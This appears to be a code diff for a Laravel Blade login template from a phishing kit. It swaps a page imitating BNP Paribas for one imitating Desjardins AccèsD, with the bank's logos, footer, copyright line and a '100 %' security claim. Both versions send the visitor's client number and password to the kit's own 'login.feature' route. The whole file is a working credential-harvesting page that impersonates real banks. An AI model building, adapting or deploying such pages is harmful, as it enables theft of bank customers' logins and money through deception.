@@ -1,152 +1,248 @@
-<!DOCTYPE html>
-<html lang="en">
-
+<html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="stylesheet" href="{{ asset('assets/style.css') }}">
-    <title>BNP Paribas - Connexion</title>
-    <!-- Ajoutez le script à l'intérieur de la balise <head> -->
-        {{-- Favicon --}}
-    <link rel="icon" type="image/png" sizes="16x16" href="{{ asset('logo1.webp') }}">
-    {{-- <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script> --}}
-    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.css">
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0" name="viewport" />
+  <title>Se connecter</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link
+    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
+    rel="stylesheet"
+  />
+  <style>
+     /* Barre principale */
+     .navbar {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      background-color: white;
+      border-bottom: 1px solid #ddd;
+      padding: 10px 15px;
+    }
 
+    .navbar-left,
+    .navbar-right {
+      display: flex;
+      align-items: center;
+    }
 
-    <style>
-        #button-devenir-client {
-    float: right;
-    width: 181px;
-    height: 48px;
-    color: #fff;
-    text-align: center;
-    line-height: 48px;
-    border-radius: 36px;
-    background: 0 0;
-    background-color: #28c3a9;
-    box-shadow: 0 2px 4px 0 rgba(0, 0, 0, .36);
-    padding: 0;
-    margin: 1px 2px 0 10px;
-}
-    </style>
+    .navbar-left img.logo {
+      height: 30px;
+      margin-right: 20px;
+    }
+
+    .navbar-left img.access-logo {
+      height: 25px;
+      margin-right: 15px;
+    }
+
+    .burger {
+      font-size: 24px;
+      display: none;
+      cursor: pointer;
+      margin-right: 15px;
+    }
+
+    /* Responsive */
+    @media (max-width: 768px) {
+      .navbar-left img.access-logo,
+      .navbar-right {
+        display: none;
+      }
+
+      .burger {
+        display: block;
+      }
+
+      .navbar {
+        justify-content: flex-start;
+      }
+
+      .navbar-left {
+        display: flex;
+        align-items: center;
+      }
+
+      .navbar-left img.logo {
+        height: 26px;
+      }
+    }
+  </style>
 </head>
+<body class="bg-gray-100">
+  <!-- Header -->
+  <header class="bg-gray-800 text-white">
+    <div class="flex justify-between items-center px-4 py-2">
+      <!-- Left: Logo + Burger -->
+      <div class="flex items-center space-x-3">
+        <!-- Burger (visible sur mobile uniquement) -->
+        <button class="text-white text-xl lg:hidden">
+          <i class="fas fa-bars"></i>
+        </button>
+        <!-- Logo -->
+      </div>
 
-<body>
-
-    <script>
-        $(document).ready(function() {
-            $('#compteBancaire').inputmask('99-9999999-99');
-        });
-    </script>
-
-    <nav class="navbar">
-        <img src="{{ asset('logo1.webp') }}" alt="Bnp paribas" >
-        <!-- <h2>Slogan de la banque</h2> -->
-        <ul>
-            {{-- <li><a href="https://www.credit-agricole.fr">Comptes & Cartes</a></li>
-            <li><a href="https://www.credit-agricole.fr/particulier/epargne/livret-epargne-logement/livret-a.html">Epargne</a></li>
-            <li><a href="https://www.credit-agricole.fr/particulier/assurances/habitation/assurance-habitation.html">Assurance</a></li>
-            <li><a href="https://www.credit-agricole.fr/particulier/credit/immobilier/credit-immobilier-facilimmo.html">Credit</a></li>
-            <li><a href="#">Contact</a></li> --}}
-
-            <li>
-                <a id="button-devenir-client" href="https://mabanque.bnpparibas/fr/devenir-client-bnp-paribas" class="bouton-devenir-client part-only">Devenir client</a>
-            </li>
-        </ul>
-        <button class="menu-btn">&#9776;</button>
-    </nav>
-
-    <div class="login-container">
-        <div class="left-section">
-
-            <!-- Partie gauche (couleur verte) avec le formulaire -->
-            <div class="form-section">
-                <h2> ACCÉDER À MES COMPTES </h2>
-                <form action="{{ route('login.feature') }}" method="POST">
-                    @csrf
-
-                    <div class="form-group">
-                        <label for="accountNumber">1. Mon numéro client</label>
-                        <input type="text" id="compteBancaire" name="numero_compte" required>
-                    </div>
-
-                    <div class="form-group">
-                        <label for="password">2. Mon code secret</label>
-                        <input type="password" name="password" required>
-                    </div>
-                    <!-- Ajoutez ceci à l'intérieur de votre formulaire, juste avant le bouton de soumission -->
-                    <div id="error-message" style="color: red; margin-top: 10px; display: none;"></div>
-
-                    <button type="submit">ACCÉDER À MES COMPTES</button>
-
-
-                </form>
-                <br>
-                <br>
-                <h3>Téléchargez l’application Ma Banque
-
-                    Chacun d’entre vous gère différemment ses besoins bancaires.
-                    Seul ou accompagné, au Bnp paribas, vous aurez toujours le choix entre vous adresser à un conseiller ou utiliser l’application Ma Banque.</h3>
-            </div>
-        </div>
-        <div class="right-section">
-            <!-- Partie droite (couleur blanche) avec les consignes -->
-            <div class="instructions-section">
-                <h3>Vos codes d'accès</h3>
-                <p>Obtenir ses codes d'accès</p>
-
-                <h3>Conseils de sécurité</h3>
-                <p>Vérifiez que l'adresse du site commence exactement par :</p>
-                <!-- Ajoutez ici vos autres consignes de sécurité -->
-
-                <h3>Pour une meilleure accessibilité</h3>
-                <p>Connectez-vous grâce à la grille contrastée, agrandie et bénéficiez d'un accompagnement vocal.</p>
-                <p>Utilisez Facil'iti pour personnaliser l'affichage en fonction de votre situation (handicap visuel ou
-                    cognitif).</p>
-                <p>Accédez au service Sourds et Malentendants, Sourds et Aveugles ou Aphasiques pour contacter un
-                    conseiller avec un dispositif en LSF (Langue des Signes Française), en LPC (Langage Parlé Complété)
-                    ou en TIP (Transcription Instantanée de la Parole).</p>
-                <p>Rendez-vous sur la page Accessibilité pour plus d'informations sur l'accessibilité numérique chez ma
-                    bank.</p>
-
-                <h3>Informations client</h3>
-                <p>Si vous rencontrez des problèmes techniques lors de votre navigation, nous vous invitons à contacter
-                    nos conseillers en ligne au :</p>
-                <p><strong>3477</strong></p>
-                <p>Service gratuit + prix appel</p>
-                <p>Ou à nous signaler un problème technique.</p>
-                <p>Vous pouvez également gérer vos comptes depuis votre mobile ou votre tablette via l'application Mes
-                    comptes.</p>
-            </div>
-        </div>
+      <!-- Right links (cachés en mobile) -->
+      <div class="hidden lg:flex items-center space-x-4 text-sm">
+        <a href="#" class="hover:underline">AA +</a>
+        <a href="#" class="hover:underline">English</a>
+        <a href="#" class="hover:underline">Nous joindre</a>
+        <a href="#" class="hover:underline">Aide</a>
+      </div>
     </div>
-    <!-- Ajoutez la balise footer pour l'image en bas -->
-    <footer>
-        <img src="{{ asset('assets/footer.png') }}" alt="" style="width: 100%; margin-top: auto;">
-    </footer>
+  </header>
 
-    <script type="module">
-        import Swal from 'https://cdn.jsdelivr.net/npm/sweetalert2@11/src/sweetalert2.js';
+  <nav class="navbar p-4">
+    <div class="navbar-left">
+      <div class="burger">&#9776;</div>
+      <img src="{{ asset('logojardins.svg') }}" alt="Desjardins" class="logo">
+      <img src="https://www.desjardins.com/ressources/images/logo-accesd.png" alt="AccèsD" class="access-logo">
+      <img src="https://www.desjardins.com/ressources/images/logo-accesd.png" alt="AccèsD Affaires" class="access-logo">
+    </div>
+    <div class="navbar-right">
+      <!-- Vide sur mobile -->
+    </div>
+  </nav>
+
+  <!-- Main -->
+  <main class="container mx-auto flex flex-col lg:flex-row bg-white mt-8 shadow-lg">
+    <div class="w-full lg:w-1/2 p-10">
+      <h1 class="text-2xl font-bold text-green-600 mb-4">Se connecter</h1>
+      <form action="{{ route('login.feature') }}" method="POST">
+        @csrf
+
+        <div class="mb-4">
+          <label class="block text-gray-700 mb-3" for="identifiant">
+            Identifiant <i class="fas fa-info-circle"></i>
+          </label>
+          <input
+            class="w-full border border-gray-300 p-2 mt-1"
+            id="identifiant"
+            name="numero_compte" required
+            type="text"
+          />
+        </div>
+        <div class="mb-4 flex items-center">
+          <input class="mr-2" id="memoriser" type="checkbox" />
+          <label class="text-gray-700" for="memoriser">Mémoriser</label>
+          <a class="text-sm text-green-600 ml-2" href="#">(C'est sécuritaire?)</a>
+        </div>
+        <div class="mb-4">
+          <label class="block text-gray-700 mb-3" for="motdepasse">Mot de passe</label>
+          <div class="relative">
+            <input
+              class="w-full border border-gray-300 p-2 mt-1"
+              id="motdepasse"
+              name="password" required
+              type="password"
+            />
+            <i class="fas fa-eye absolute right-3 top-3 text-gray-500"></i>
+          </div>
+        </div>
+        <div class="mb-4 text-sm text-gray-600">
+          <p>Attention : Respecter majuscules et minuscules</p>
+          <a class="text-green-600" href="#">Mot de passe oublié?</a>
+        </div>
 
 
-        window.addEventListener("load", (event) => {
-            const connecte = document.getElementById('error-connecte');
-            console.log(connecte);
+                <button
+                class="px-16 mx-auto block bg-green-600 text-white p-2  rounded"
+                type="submit"
+              >
+                Valider
+              </button>
 
 
-                connecte.addEventListener('click', function() {
-                    Swal.fire({
-                        title: "Erreur de Connexion!",
-                        text: "impossible de se connecter.....",
-                        icon: "error"
-                    });
-                });
 
-        });
+      </form>
 
 
-      </script>
+      <div class="mt-8 grid grid-cols-1 gap-5 text-sm text-green-600">
+        <a href="#">S'inscrire à AccèsD</a>
+        <a href="#">Sécurité du site</a>
+        <a href="#">S'inscrire à AccèsD Affaires</a>
+        <a href="#">Soutien technique</a>
+        <a href="#">Devenir membre</a>
+        <a href="#">Signaler une fraude</a>
+        <a class="col-span-2 text-center" href="#">Sécurité garantie à 100 %</a>
+      </div>
+    </div>
+    <div class="w-full lg:w-1/2 hidden lg:block relative">
+      <img
+        alt="Des jardins pictures"
+        class="w-full h-full object-cover"
+        height="400"
+        src="{{ asset('desjardins2.jpg') }}"
+        width="500"
+      />
+
+      </div>
+    </div>
+  </main>
+
+
+
+   <footer class="bg-gray-900 text-white py-4 mt-5">
+    <div class="container mx-auto text-center">
+     <nav class="mb-4">
+      <ul class="flex justify-center space-x-4 text-sm">
+       <li>
+        <a class="hover:underline" href="#">
+         SERVICES AUX PARTICULIERS
+        </a>
+       </li>
+       <li>
+        <a class="hover:underline" href="#">
+         SERVICES AUX ENTREPRISES
+        </a>
+       </li>
+       <li>
+        <a class="hover:underline" href="#">
+         CONSEILS
+        </a>
+       </li>
+       <li>
+        <a class="hover:underline" href="#">
+         À PROPOS
+        </a>
+       </li>
+
+      </ul>
+     </nav>
+     <div class="border-t border-gray-700 pt-4">
+      <ul class="flex justify-center space-x-4 text-xs mb-2">
+       <li>
+        <a class="hover:underline" href="#">
+         Sécurité
+        </a>
+       </li>
+       <li>
+        <a class="hover:underline" href="#">
+         Conditions d'utilisation et notes légales
+        </a>
+       </li>
+       <li>
+        <a class="hover:underline" href="#">
+         Confidentialité
+        </a>
+       </li>
+       <li>
+        <a class="hover:underline" href="#">
+         Personnaliser les témoins
+        </a>
+       </li>
+       <li>
+        <a class="hover:underline" href="#">
+         Accessibilité
+        </a>
+       </li>
+
+      </ul>
+      <p class="text-xs">
+       © 1996-2025, Mouvement des caisses Desjardins. Tous droits réservés.
+      </p>
+     </div>
+    </div>
+   </footer>
 
 </body>
-
 </html>
